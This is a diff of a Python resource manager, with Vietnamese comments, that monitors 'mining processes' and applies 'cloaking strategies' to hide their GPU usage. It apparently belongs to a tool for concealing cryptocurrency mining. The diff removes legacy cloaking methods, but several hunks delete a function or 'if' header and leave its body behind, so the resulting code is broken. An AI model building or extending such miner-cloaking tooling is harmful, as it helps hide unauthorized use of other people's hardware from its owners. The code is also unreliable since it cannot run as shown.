@@ -150,17 +150,6 @@ class SharedResourceManager:
             self.logger.debug(f"Không thể lấy GPU usage cho PID {pid}: {e}")
             return 0.0
 
-    def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
-        """**Apply Cloaking Strategy** (áp dụng chiến lược che giấu)
-        
-        DEPRECATED: This method is replaced by the new linear pipeline.
-        Use trigger_cloaking() instead which uses CloakCoordinator.
-        """
-        self.logger.warning(f"[DEPRECATED] apply_cloak_strategy() is deprecated. Use trigger_cloaking() instead.")
-        
-        # Forward to new linear pipeline method
-        return self.trigger_cloaking(process, f'legacy_{strategy_name}')
-
 class ResourceManager(IResourceManager):
     """
     **Main Resource Manager Class** (lớp quản lý tài nguyên chính)
@@ -443,11 +432,7 @@ class ResourceManager(IResourceManager):
             self.logger.debug(f"[RM] Traceback: {traceback.format_exc()}")
             return False
 
-    def _determine_strategies(self, process: MiningProcess) -> List[str]:
-        """Legacy method removed – returns empty list"""
-        return []
-        """Determine appropriate cloaking strategies for the process"""
-        strategies = []
+
         
         try:
             self.logger.debug(f"Determining strategies for process: {process.name}")
@@ -481,7 +466,7 @@ class ResourceManager(IResourceManager):
             self.logger.error(f"Error determining strategies: {e}")
             return ['gpu_cloaking']  # Fallback to default strategy
 
-    def _is_strategy_available(self, strategy_name: str) -> bool:
+
         """Check if the specified strategy is available for use"""
         try:
             # Simple validation of known strategy names
@@ -837,8 +822,7 @@ class ResourceManager(IResourceManager):
                         metrics = self.collect_metrics(mining_process)
                         self.logger.debug(f"📈 [MONITOR] PID {pid} metrics: GPU={metrics.get('gpu_usage', 0):.1f}%")
                         
-                        # **Re-apply cloaking if needed** (áp dụng lại cloaking nếu cần)
-                        if metrics.get('gpu_usage', 0) > 0:  # Process is actively using GPU
+
                             
                 
                 except (psutil.NoSuchProcess, psutil.AccessDenied):
@@ -860,29 +844,7 @@ class ResourceManager(IResourceManager):
         except Exception as e:
             self.logger.error(f"❌ [MONITOR] Monitoring cycle failed: {e}")
     
-    def _reapply_cloaking_if_needed(self, mining_process: MiningProcess):
-        """Legacy method removed – no-op"""
-        return
-        """
-        **🥇 SOLUTION 1: Re-apply Cloaking If Needed** (áp dụng lại cloaking nếu cần)
-        
-        Check if cloaking needs to be reapplied cho process.
-        """
-        try:
-            # **Simple re-application logic** (logic áp dụng lại đơn giản)
-            # In a more sophisticated system, this would check if cloaking is still effective
-            strategies = self._determine_strategies(mining_process)
-            
-            for strategy_name in strategies:
-                if self.shared_resource_manager:
-                    success = self.shared_resource_manager.apply_cloak_strategy(strategy_name, mining_process)
-                    if success:
-                        self.logger.debug(f"🔄 [REAPPLY] Re-applied {strategy_name} to PID {mining_process.pid}")
-                    else:
-                        self.logger.warning(f"⚠️ [REAPPLY] Failed to re-apply {strategy_name} to PID {mining_process.pid}")
-                        
-        except Exception as e:
-            self.logger.error(f"❌ [REAPPLY] Failed to reapply cloaking for PID {mining_process.pid}: {e}")
+
 
     def _start_pid_file_scanner(self):
         """
